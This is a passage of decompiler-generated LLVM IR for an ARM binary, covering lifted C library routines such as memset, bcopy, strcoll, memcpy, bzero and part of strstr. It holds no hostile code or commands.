  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_15668, label %dec_label_pc_15690, label %dec_label_pc_1567c

dec_label_pc_1567c:                               ; preds = %entry
  %v4_15684 = call i32 @__stdio_trans2w_o(i8* %arg4, i32 128)
  %v2_15688 = icmp eq i32 %v4_15684, 0
  br i1 %v2_15688, label %dec_label_pc_15690thread-pre-split, label %dec_label_pc_156fc

dec_label_pc_15690thread-pre-split:               ; preds = %dec_label_pc_1567c
  %v0_15690.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_15690

dec_label_pc_15690:                               ; preds = %dec_label_pc_15690thread-pre-split, %entry
  %v0_156b4 = phi i32 [ %v0_15690.pr, %dec_label_pc_15690thread-pre-split ], [ %arg2, %entry ]
  %v2_15690 = icmp eq i32 %v0_156b4, 0
  br i1 %v2_15690, label %dec_label_pc_156fc, label %bb

bb:                                               ; preds = %dec_label_pc_15690
  %v1_15694 = load i32, i32* @r6, align 4
  %v3_15694 = icmp eq i32 %v1_15694, 0
  br i1 %v3_15694, label %dec_label_pc_156fc, label %dec_label_pc_1569c

dec_label_pc_1569c:                               ; preds = %bb
  %v2_156a4 = udiv i32 -1, %v0_156b4
  %tmp9 = icmp ugt i32 %v1_15694, %v2_156a4
  %v0_156d0 = load i32, i32* @r4, align 4
  br i1 %tmp9, label %dec_label_pc_156d0, label %dec_label_pc_156b0

dec_label_pc_156b0:                               ; preds = %dec_label_pc_1569c
  %v1_156b0 = inttoptr i32 %v0_156d0 to i8*
  store i32 %v0_156d0, i32* %r2.global-to-local, align 4
  %v2_156b4 = mul i32 %v1_15694, %v0_156b4
  %v0_156b8 = load i32, i32* @r7, align 4
  %v5_156bc = call i32 @__stdio_fwrite(i32 %v0_156b8, i32 %v2_156b4, i8* %v1_156b0)
  %v0_156c0 = load i32, i32* @r5, align 4
  %v2_156c4 = udiv i32 %v5_156bc, %v0_156c0
  store i32 %v2_156c4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15700

dec_label_pc_156d0:                               ; preds = %dec_label_pc_1569c
  %v1_156d0 = inttoptr i32 %v0_156d0 to i32*
  %v2_156d0 = load i32, i32* %v1_156d0, align 4
  %v3_156d4 = udiv i32 %v2_156d0, 65536
  %v1_156d8 = or i32 %v3_156d4, 8
  store i32 %v1_156d8, i32* %r3.global-to-local, align 4
  %v3_156dc1 = udiv i32 %v2_156d0, 16777216
  store i32 %v3_156dc1, i32* %r2.global-to-local, align 4
  %v1_156e0 = trunc i32 %v3_156dc1 to i8
  %v3_156e0 = inttoptr i32 %v0_156d0 to i8*
  store i8 %v1_156e0, i8* %v3_156e0, align 1
  %v0_156e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_156e4 = trunc i32 %v0_156e4 to i8
  %v2_156e4 = load i32, i32* @r4, align 4
  %v3_156e4 = add i32 %v2_156e4, 1
  %v4_156e4 = inttoptr i32 %v3_156e4 to i8*
  store i8 %v1_156e4, i8* %v4_156e4, align 1
  %v0_156e8 = call i32 @__GI___errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_156f4 = inttoptr i32 %v0_156e8 to i32*
  store i32 22, i32* %v2_156f4, align 4
  %v0_15700.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15700

dec_label_pc_156fc:                               ; preds = %dec_label_pc_15690, %dec_label_pc_1567c, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15700

dec_label_pc_15700:                               ; preds = %dec_label_pc_156d0, %dec_label_pc_156b0, %dec_label_pc_156fc
  %v0_15700 = phi i32 [ %v0_15700.pre, %dec_label_pc_156d0 ], [ %v2_156c4, %dec_label_pc_156b0 ], [ 0, %dec_label_pc_156fc ]
  store i32 %v9_15658, i32* @r6, align 4
  store i32 %v12_15658, i32* @r7, align 4
  ret i32 %v0_15700

; uselistorder directives
  uselistorder i32 %v3_156dc1, { 1, 0 }
  uselistorder i32 %v0_156d0, { 0, 3, 1, 2 }
  uselistorder i32 %v1_15694, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i8*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_15700, { 2, 0, 1 }
  uselistorder label %dec_label_pc_156fc, { 2, 0, 1 }
}

define i32 @function_15708(i32 %arg1) local_unnamed_addr {
dec_label_pc_15708:
  ret i32 %arg1
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_15714 = load i32, i32* @r2, align 4
  %v8_15714 = icmp eq i32 %v0_15714, 8
  store i1 %v8_15714, i1* %cpsr_z.global-to-local, align 1
  %v5_15718 = icmp slt i32 %v0_15714, 8
  br i1 %v5_15718, label %dec_label_pc_15778, label %dec_label_pc_1571c

dec_label_pc_1571c:                               ; preds = %entry
  %v4_1571c = mul i32 %arg2, 256
  %v5_1571c = or i32 %v4_1571c, %arg2
  %v4_15720 = mul i32 %v5_1571c, 65536
  %v5_15720 = or i32 %v4_15720, %v5_1571c
  store i32 %v5_15720, i32* %r1.global-to-local, align 4
  %v1_1572457 = urem i32 %tmp, 4
  %v2_1572458 = icmp eq i32 %v1_1572457, 0
  store i1 %v2_1572458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1572458, label %dec_label_pc_15734, label %bb

bb:                                               ; preds = %dec_label_pc_1571c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1571c ]
  %v3_1572859 = phi i32 [ %v6_15728, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1571c ]
  %v4_15728 = inttoptr i32 %v3_1572859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_15728, align 1
  %v5_15728 = load i32, i32* %r3.global-to-local, align 4
  %v6_15728 = add i32 %v5_15728, 1
  store i32 %v6_15728, i32* %r3.global-to-local, align 4
  %v0_1572c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_15738.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1572c.pr, label %dec_label_pc_15734, label %.thread

.thread:                                          ; preds = %bb
  %v2_1572c = add i32 %v0_15738.pr.pre, -1
  store i32 %v2_1572c, i32* @r2, align 4
  %v1_15724 = urem i32 %v6_15728, 4
  %v2_15724 = icmp eq i32 %v1_15724, 0
  store i1 %v2_15724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15724, label %dec_label_pc_15734, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_15728.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_15728.pre to i8
  br label %bb

dec_label_pc_15734:                               ; preds = %.thread, %bb, %dec_label_pc_1571c
  %v0_1574028 = phi i32 [ %tmp, %dec_label_pc_1571c ], [ %v6_15728, %bb ], [ %v6_15728, %.thread ]
  %v0_15738.pr = phi i32 [ %v0_15714, %dec_label_pc_1571c ], [ %v0_15738.pr.pre, %bb ], [ %v2_1572c, %.thread ]
  %v0_15734 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15734, i32* @ip, align 4
  %v8_1573810 = icmp eq i32 %v0_15738.pr, 8
  store i1 %v8_1573810, i1* %cpsr_z.global-to-local, align 1
  %v5_1573c11 = icmp slt i32 %v0_15738.pr, 8
  br i1 %v5_1573c11, label %dec_label_pc_15778, label %dec_label_pc_15740.preheader

dec_label_pc_15740.preheader:                     ; preds = %dec_label_pc_15734
  %v1_1574046 = inttoptr i32 %v0_1574028 to i32*
  store i32 %v0_15734, i32* %v1_1574046, align 4
  %v3_1574047 = add i32 %v0_1574028, 4
  %v4_1574048 = inttoptr i32 %v3_1574047 to i32*
  %v5_1574049 = load i32, i32* @ip, align 4
  store i32 %v5_1574049, i32* %v4_1574048, align 4
  %v6_1574050 = add i32 %v0_1574028, 8
  store i32 %v6_1574050, i32* %r3.global-to-local, align 4
  %v0_1574451 = load i32, i32* @r2, align 4
  %v1_1574452 = add i32 %v0_1574451, -8
  store i32 %v1_1574452, i32* @r2, align 4
  %v5_1574c53 = icmp slt i32 %v1_1574452, 8
  br i1 %v5_1574c53, label %dec_label_pc_15740.dec_label_pc_15778.loopexit_crit_edge, label %dec_label_pc_15750

dec_label_pc_15750:                               ; preds = %dec_label_pc_15740.preheader, %dec_label_pc_15738.dec_label_pc_15740_crit_edge
  %v6_1574055 = phi i32 [ %v6_15740, %dec_label_pc_15738.dec_label_pc_15740_crit_edge ], [ %v6_1574050, %dec_label_pc_15740.preheader ]
  %v0_1574054 = phi i32 [ %v12_1576c, %dec_label_pc_15738.dec_label_pc_15740_crit_edge ], [ %v0_1574028, %dec_label_pc_15740.preheader ]
  %v1_15750 = inttoptr i32 %v6_1574055 to i32*
  %v2_15750 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15750, i32* %v1_15750, align 4
  %v3_15750 = add i32 %v0_1574054, 12
  %v4_15750 = inttoptr i32 %v3_15750 to i32*
  %v5_15750 = load i32, i32* @ip, align 4
  store i32 %v5_15750, i32* %v4_15750, align 4
  %v6_15750 = add i32 %v0_1574054, 16
  store i32 %v6_15750, i32* %r3.global-to-local, align 4
  %v0_15754 = load i32, i32* @r2, align 4
  %v1_15754 = add i32 %v0_15754, -8
  store i32 %v1_15754, i32* @r2, align 4
  %v5_1575c = icmp slt i32 %v1_15754, 8
  br i1 %v5_1575c, label %dec_label_pc_15750.dec_label_pc_15778.loopexit_crit_edge, label %dec_label_pc_15760

dec_label_pc_15760:                               ; preds = %dec_label_pc_15750
  %v1_15760 = inttoptr i32 %v6_15750 to i32*
  %v2_15760 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15760, i32* %v1_15760, align 4
  %v3_15760 = add i32 %v0_1574054, 20
  %v4_15760 = inttoptr i32 %v3_15760 to i32*
  %v5_15760 = load i32, i32* @ip, align 4
  store i32 %v5_15760, i32* %v4_15760, align 4
  %v6_15760 = add i32 %v0_1574054, 24
  store i32 %v6_15760, i32* %r3.global-to-local, align 4
  %v0_15764 = load i32, i32* @r2, align 4
  %v1_15764 = add i32 %v0_15764, -8
  store i32 %v1_15764, i32* @r2, align 4
  %v5_1576c = icmp slt i32 %v1_15764, 8
  br i1 %v5_1576c, label %dec_label_pc_15760.dec_label_pc_15778.loopexit_crit_edge, label %dec_label_pc_15738

dec_label_pc_15738:                               ; preds = %dec_label_pc_15760
  %v7_1576c = inttoptr i32 %v6_15760 to i32*
  %v8_1576c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1576c, i32* %v7_1576c, align 4
  %v9_1576c = add i32 %v0_1574054, 28
  %v10_1576c = inttoptr i32 %v9_1576c to i32*
  %v11_1576c = load i32, i32* @ip, align 4
  store i32 %v11_1576c, i32* %v10_1576c, align 4
  %v12_1576c = add i32 %v0_1574054, 32
  store i32 %v12_1576c, i32* %r3.global-to-local, align 4
  %v6_15770 = load i32, i32* @r2, align 4
  %v7_15770 = add i32 %v6_15770, -8
  store i32 %v7_15770, i32* @r2, align 4
  %v5_1573c = icmp slt i32 %v7_15770, 8
  br i1 %v5_1573c, label %dec_label_pc_15738.dec_label_pc_15778.loopexit_crit_edge, label %dec_label_pc_15738.dec_label_pc_15740_crit_edge

dec_label_pc_15738.dec_label_pc_15740_crit_edge:  ; preds = %dec_label_pc_15738
  %v2_15740.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15740 = inttoptr i32 %v12_1576c to i32*
  store i32 %v2_15740.pre, i32* %v1_15740, align 4
  %v3_15740 = add i32 %v0_1574054, 36
  %v4_15740 = inttoptr i32 %v3_15740 to i32*
  %v5_15740 = load i32, i32* @ip, align 4
  store i32 %v5_15740, i32* %v4_15740, align 4
  %v6_15740 = add i32 %v0_1574054, 40
  store i32 %v6_15740, i32* %r3.global-to-local, align 4
  %v0_15744 = load i32, i32* @r2, align 4
  %v1_15744 = add i32 %v0_15744, -8
  store i32 %v1_15744, i32* @r2, align 4
  %v5_1574c = icmp slt i32 %v1_15744, 8
  br i1 %v5_1574c, label %dec_label_pc_15740.dec_label_pc_15778.loopexit_crit_edge, label %dec_label_pc_15750

dec_label_pc_15738.dec_label_pc_15778.loopexit_crit_edge: ; preds = %dec_label_pc_15738
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15778

dec_label_pc_15740.dec_label_pc_15778.loopexit_crit_edge: ; preds = %dec_label_pc_15738.dec_label_pc_15740_crit_edge, %dec_label_pc_15740.preheader
  %v1_15744.lcssa = phi i32 [ %v1_1574452, %dec_label_pc_15740.preheader ], [ %v1_15744, %dec_label_pc_15738.dec_label_pc_15740_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15778

dec_label_pc_15750.dec_label_pc_15778.loopexit_crit_edge: ; preds = %dec_label_pc_15750
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15778

dec_label_pc_15760.dec_label_pc_15778.loopexit_crit_edge: ; preds = %dec_label_pc_15760
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15778

dec_label_pc_15778:                               ; preds = %dec_label_pc_15734, %dec_label_pc_15738.dec_label_pc_15778.loopexit_crit_edge, %dec_label_pc_15740.dec_label_pc_15778.loopexit_crit_edge, %dec_label_pc_15750.dec_label_pc_15778.loopexit_crit_edge, %dec_label_pc_15760.dec_label_pc_15778.loopexit_crit_edge, %entry
  %v0_15780 = phi i32 [ %v0_15714, %entry ], [ %v1_15764, %dec_label_pc_15760.dec_label_pc_15778.loopexit_crit_edge ], [ %v1_15754, %dec_label_pc_15750.dec_label_pc_15778.loopexit_crit_edge ], [ %v1_15744.lcssa, %dec_label_pc_15740.dec_label_pc_15778.loopexit_crit_edge ], [ %v7_15770, %dec_label_pc_15738.dec_label_pc_15778.loopexit_crit_edge ], [ %v0_15738.pr, %dec_label_pc_15734 ]
  %v2_15778 = icmp eq i32 %v0_15780, 0
  store i1 %v2_15778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15778, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_15778
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_15778
  %v1_15780 = sub i32 7, %v0_15780
  store i32 %v1_15780, i32* @r2, align 4
  %v3_15784 = mul i32 %v1_15780, 4
  %v4_15784 = add i32 %v3_15784, ptrtoint (i32* @global_var_1578c.1378 to i32)
  call void @__pseudo_branch(i32 %v4_15784)
  %v0_1578c = load i32, i32* %r1.global-to-local, align 4
  %v1_1578c = trunc i32 %v0_1578c to i8
  %v2_1578c = load i32, i32* %r3.global-to-local, align 4
  %v3_1578c = inttoptr i32 %v2_1578c to i8*
  store i8 %v1_1578c, i8* %v3_1578c, align 1
  %v4_1578c = load i32, i32* %r3.global-to-local, align 4
  %v5_1578c = add i32 %v4_1578c, 1
  store i32 %v5_1578c, i32* %r3.global-to-local, align 4
  %v0_15790 = load i32, i32* %r1.global-to-local, align 4
  %v1_15790 = trunc i32 %v0_15790 to i8
  %v3_15790 = inttoptr i32 %v5_1578c to i8*
  store i8 %v1_15790, i8* %v3_15790, align 1
  %v4_15790 = load i32, i32* %r3.global-to-local, align 4
  %v5_15790 = add i32 %v4_15790, 1
  store i32 %v5_15790, i32* %r3.global-to-local, align 4
  %v0_15794 = load i32, i32* %r1.global-to-local, align 4
  %v1_15794 = trunc i32 %v0_15794 to i8
  %v3_15794 = inttoptr i32 %v5_15790 to i8*
  store i8 %v1_15794, i8* %v3_15794, align 1
  %v4_15794 = load i32, i32* %r3.global-to-local, align 4
  %v5_15794 = add i32 %v4_15794, 1
  store i32 %v5_15794, i32* %r3.global-to-local, align 4
  %v0_15798 = load i32, i32* %r1.global-to-local, align 4
  %v1_15798 = trunc i32 %v0_15798 to i8
  %v3_15798 = inttoptr i32 %v5_15794 to i8*
  store i8 %v1_15798, i8* %v3_15798, align 1
  %v4_15798 = load i32, i32* %r3.global-to-local, align 4
  %v5_15798 = add i32 %v4_15798, 1
  store i32 %v5_15798, i32* %r3.global-to-local, align 4
  %v0_1579c = load i32, i32* %r1.global-to-local, align 4
  %v1_1579c = trunc i32 %v0_1579c to i8
  %v3_1579c = inttoptr i32 %v5_15798 to i8*
  store i8 %v1_1579c, i8* %v3_1579c, align 1
  %v4_1579c = load i32, i32* %r3.global-to-local, align 4
  %v5_1579c = add i32 %v4_1579c, 1
  store i32 %v5_1579c, i32* %r3.global-to-local, align 4
  %v0_157a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_157a0 = trunc i32 %v0_157a0 to i8
  %v3_157a0 = inttoptr i32 %v5_1579c to i8*
  store i8 %v1_157a0, i8* %v3_157a0, align 1
  %v4_157a0 = load i32, i32* %r3.global-to-local, align 4
  %v5_157a0 = add i32 %v4_157a0, 1
  store i32 %v5_157a0, i32* %r3.global-to-local, align 4
  %v0_157a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_157a4 = trunc i32 %v0_157a4 to i8
  %v3_157a4 = inttoptr i32 %v5_157a0 to i8*
  store i8 %v1_157a4, i8* %v3_157a4, align 1
  %v4_157a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_157a4 = add i32 %v4_157a4, 1
  store i32 %v5_157a4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_15740, { 1, 0 }
  uselistorder i32 %v12_1576c, { 1, 2, 0 }
  uselistorder i32 %v0_1574054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_15738.pr, { 0, 2, 1 }
  uselistorder i32 %v6_15728, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1571c, { 1, 0 }
  uselistorder i32 %v0_15714, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 21, 20, 22, 14, 15, 16, 13, 17, 18, 19 }
  uselistorder i32* %r1.global-to-local, { 8, 3, 4, 13, 7, 6, 5, 1, 9, 10, 11, 12, 2, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 1, 8, 7, 0, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15778, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15750, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_1581c = inttoptr i32 %arg2 to i8*
  %v3_1581c = call i32 @_memcpy(i8* %v2_1581c, i32 %arg1)
  ret i32 %v3_1581c
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15824.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_15824 = phi i32 [ %v0_15824.pre, %bb ], [ %v5_15824, %bb3 ]
  %v0_15820 = phi i32 [ %tmp, %bb ], [ %v5_15820, %bb3 ]
  %v1_15820 = inttoptr i32 %v0_15820 to i8*
  %v2_15820 = load i8, i8* %v1_15820, align 1
  %v3_15820 = zext i8 %v2_15820 to i32
  store i32 %v3_15820, i32* @r2, align 4
  %v1_15824 = inttoptr i32 %v0_15824 to i8*
  %v2_15824 = load i8, i8* %v1_15824, align 1
  %v3_15824 = zext i8 %v2_15824 to i32
  %v2_15828 = icmp eq i8 %v2_15820, 0
  br i1 %v2_15828, label %.dec_label_pc_15834_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_15824 = add i32 %v0_15824, 1
  %v5_15820 = add i32 %v0_15820, 1
  %v10_1582c = icmp eq i8 %v2_15820, %v2_15824
  br i1 %v10_1582c, label %entry, label %dec_label_pc_15834

.dec_label_pc_15834_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_15834

dec_label_pc_15834:                               ; preds = %bb3, %.dec_label_pc_15834_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_15834_crit_edge ], [ %v3_15820, %bb3 ]
  %v2_15834.pre-phi = sub nsw i32 %.pn, %v3_15824
  ret i32 %v2_15834.pre-phi

; uselistorder directives
  uselistorder i32 %v0_15820, { 1, 0 }
  uselistorder i32 %v0_15824, { 1, 0 }
  uselistorder label %dec_label_pc_15834, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_15840 = load i32, i32* @r0, align 4
  %v1_15840 = load i32, i32* @r1, align 4
  %v2_15840 = inttoptr i32 %v0_15840 to i8*
  %v3_15840 = call i32 @_memcpy(i8* %v2_15840, i32 %v1_15840)
  ret i32 %v3_15840
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_15858 = load i32, i32* @r0, align 4
  %v2_15858 = inttoptr i32 %v0_15858 to i8*
  %v3_15858 = call i32 @__GI_memset(i8* %v2_15858, i32 0)
  ret i32 %v3_15858
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %v6_15860 = load i32, i32* @r5, align 4
  %v9_15860 = load i32, i32* @r6, align 4
  %v3_15864 = load i8, i8* %arg2, align 1
  %v2_15868 = icmp eq i8 %v3_15864, 0
  br i1 %v2_15868, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_15870 = add i32 %arg1, -1
  br label %dec_label_pc_15874

dec_label_pc_15874:                               ; preds = %dec_label_pc_15880, %bb50
  %v0_15874 = phi i32 [ %v1_15874, %dec_label_pc_15880 ], [ %v1_15870, %bb50 ]
  %v1_15874 = add i32 %v0_15874, 1
  %v2_15874 = inttoptr i32 %v1_15874 to i8*
  %v3_15874 = load i8, i8* %v2_15874, align 1
  %v2_15878 = icmp eq i8 %v3_15874, 0
  br i1 %v2_15878, label %dec_label_pc_15950, label %dec_label_pc_15880

dec_label_pc_15880:                               ; preds = %dec_label_pc_15874
  %v9_15880 = icmp eq i8 %v3_15874, %v3_15864
  br i1 %v9_15880, label %dec_label_pc_15888, label %dec_label_pc_15874

dec_label_pc_15888:                               ; preds = %dec_label_pc_15880
  %v2_15888 = add i32 %tmp, 1
  %v3_15888 = inttoptr i32 %v2_15888 to i8*
  %v4_15888 = load i8, i8* %v3_15888, align 1
  %v2_1588c = icmp eq i8 %v4_15888, 0
  br i1 %v2_1588c, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_15888
  store i32 %v6_15860, i32* @r5, align 4
  store i32 %v9_15860, i32* @r6, align 4
  ret i32 %v1_15874

bb52:                                             ; preds = %dec_label_pc_15888
  %v1_15898 = add i32 %v0_15874, 2
  %v1_158ec = add i32 %tmp, 2
  %v2_158ec = inttoptr i32 %v1_158ec to i8*
  br label %dec_label_pc_158e4

dec_label_pc_158a8:                               ; preds = %dec_label_pc_15944
  %v3_158a8 = load i8, i8* %v3_158dc.pn.in, align 1
  br label %dec_label_pc_158d4.preheader

dec_label_pc_158d4.preheader:                     ; preds = %dec_label_pc_158a8, %dec_label_pc_158e4
  %v0_158d44.in = phi i8 [ %v3_158a8, %dec_label_pc_158a8 ], [ %v3_158dc.pn, %dec_label_pc_158e4 ]
  %v9_158d413 = icmp eq i8 %v0_158d44.in, %v3_15864
  br i1 %v9_158d413, label %dec_label_pc_158dc, label %dec_label_pc_158b4

dec_label_pc_158b4:                               ; preds = %dec_label_pc_158d4.preheader, %dec_label_pc_158d0
  %v0_158bc = phi i32 [ %v1_158d0, %dec_label_pc_158d0 ], [ %storemerge43, %dec_label_pc_158d4.preheader ]
  %v0_158b4.in = phi i8 [ %v3_158d0, %dec_label_pc_158d0 ], [ %v0_158d44.in, %dec_label_pc_158d4.preheader ]
  %v2_158b4 = icmp eq i8 %v0_158b4.in, 0
  br i1 %v2_158b4, label %dec_label_pc_15950, label %dec_label_pc_158bc

dec_label_pc_158bc:                               ; preds = %dec_label_pc_158b4
  %v1_158bc = add i32 %v0_158bc, 1
  %v2_158bc = inttoptr i32 %v1_158bc to i8*
  %v3_158bc = load i8, i8* %v2_158bc, align 1
  %v9_158c0 = icmp eq i8 %v3_158bc, %v3_15864
  br i1 %v9_158c0, label %dec_label_pc_158dc, label %dec_label_pc_158c8

dec_label_pc_158c8:                               ; preds = %dec_label_pc_158bc
  %v2_158c8 = icmp eq i8 %v3_158bc, 0
  br i1 %v2_158c8, label %dec_label_pc_15950, label %dec_label_pc_158d0

dec_label_pc_158d0:                               ; preds = %dec_label_pc_158c8
  %v1_158d0 = add i32 %v0_158bc, 2
  %v2_158d0 = inttoptr i32 %v1_158d0 to i8*
  %v3_158d0 = load i8, i8* %v2_158d0, align 1
  %v9_158d4 = icmp eq i8 %v3_158d0, %v3_15864
  br i1 %v9_158d4, label %dec_label_pc_158dc, label %dec_label_pc_158b4

dec_label_pc_158dc:                               ; preds = %dec_label_pc_158bc, %dec_label_pc_158d0, %dec_label_pc_158d4.preheader
  %v0_158dc = phi i32 [ %storemerge43, %dec_label_pc_158d4.preheader ], [ %v1_158bc, %dec_label_pc_158bc ], [ %v1_158d0, %dec_label_pc_158d0 ]
  %v1_158dc = add i32 %v0_158dc, 1
  br label %dec_label_pc_158e4

dec_label_pc_158e4:                               ; preds = %bb52, %dec_label_pc_158dc
  %storemerge43 = phi i32 [ %v1_158dc, %dec_label_pc_158dc ], [ %v1_15898, %bb52 ]
  %v3_158dc.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_158dc.pn = load i8, i8* %v3_158dc.pn.in, align 1
  %storemerge = icmp eq i8 %v3_158dc.pn, %v4_15888
  br i1 %storemerge, label %dec_label_pc_158e8, label %dec_label_pc_158d4.preheader

dec_label_pc_158e8:                               ; preds = %dec_label_pc_158e4
  %v1_158e8 = add i32 %storemerge43, 1
  %v2_158e8 = inttoptr i32 %v1_158e8 to i8*
  %v3_158e8 = load i8, i8* %v2_158e8, align 1
  %v4_158e8 = zext i8 %v3_158e8 to i32
  %v3_158ec = load i8, i8* %v2_158ec, align 1
  %v4_158ec = zext i8 %v3_158ec to i32
  %v9_158f4 = icmp eq i8 %v3_158e8, %v3_158ec
  store i32 %v1_158ec, i32* @lr, align 4
  %v1_158fc = add i32 %storemerge43, -1
  br i1 %v9_158f4, label %dec_label_pc_15904, label %dec_label_pc_15944

dec_label_pc_15904:                               ; preds = %dec_label_pc_158e8, %dec_label_pc_15900
  %v0_1591c = phi i32 [ %v1_15924, %dec_label_pc_15900 ], [ %v1_158ec, %dec_label_pc_158e8 ]
  %v0_15914 = phi i32 [ %v1_15920, %dec_label_pc_15900 ], [ %v1_158e8, %dec_label_pc_158e8 ]
  %v0_15904 = phi i32 [ %v4_15934, %dec_label_pc_15900 ], [ %v4_158e8, %dec_label_pc_158e8 ]
  %v2_15904 = icmp eq i32 %v0_15904, 0
  br i1 %v2_15904, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_15904
  store i32 %v6_15860, i32* @r5, align 4
  store i32 %v9_15860, i32* @r6, align 4
  ret i32 %v1_158fc

bb54:                                             ; preds = %dec_label_pc_15904
  %v1_1590c = add i32 %v0_15914, 1
  %v2_1590c = inttoptr i32 %v1_1590c to i8*
  %v3_1590c = load i8, i8* %v2_1590c, align 1
  %v1_15910 = add i32 %v0_1591c, 1
  %v2_15910 = inttoptr i32 %v1_15910 to i8*
  %v3_15910 = load i8, i8* %v2_15910, align 1
  %v4_15910 = zext i8 %v3_15910 to i32
  %v9_15918 = icmp eq i8 %v3_1590c, %v3_15910
  %v1_15920 = add i32 %v0_15914, 2
  %v1_15924 = add i32 %v0_1591c, 2
  store i32 %v1_15924, i32* @lr, align 4
  br i1 %v9_15918, label %dec_label_pc_1592c, label %dec_label_pc_15944

dec_label_pc_1592c:                               ; preds = %bb54
  %v2_1592c = icmp eq i8 %v3_1590c, 0
  br i1 %v2_1592c, label %bb55, label %dec_label_pc_15900

bb55:                                             ; preds = %dec_label_pc_1592c
  store i32 %v6_15860, i32* @r5, align 4
  store i32 %v9_15860, i32* @r6, align 4
  ret i32 %v1_158fc

dec_label_pc_15900:                               ; preds = %dec_label_pc_1592c
  %v2_15934 = inttoptr i32 %v1_15924 to i8*
  %v3_15934 = load i8, i8* %v2_15934, align 1
  %v4_15934 = zext i8 %v3_15934 to i32
  %v2_15938 = inttoptr i32 %v1_15920 to i8*
  %v3_15938 = load i8, i8* %v2_15938, align 1
  %v9_1593c = icmp eq i8 %v3_15938, %v3_15934
  br i1 %v9_1593c, label %dec_label_pc_15904, label %dec_label_pc_15944

dec_label_pc_15944:                               ; preds = %dec_label_pc_15900, %bb54, %dec_label_pc_158e8
  %v0_15944 = phi i32 [ %v4_158ec, %dec_label_pc_158e8 ], [ %v4_15934, %dec_label_pc_15900 ], [ %v4_15910, %bb54 ]
  %v2_15944 = icmp eq i32 %v0_15944, 0
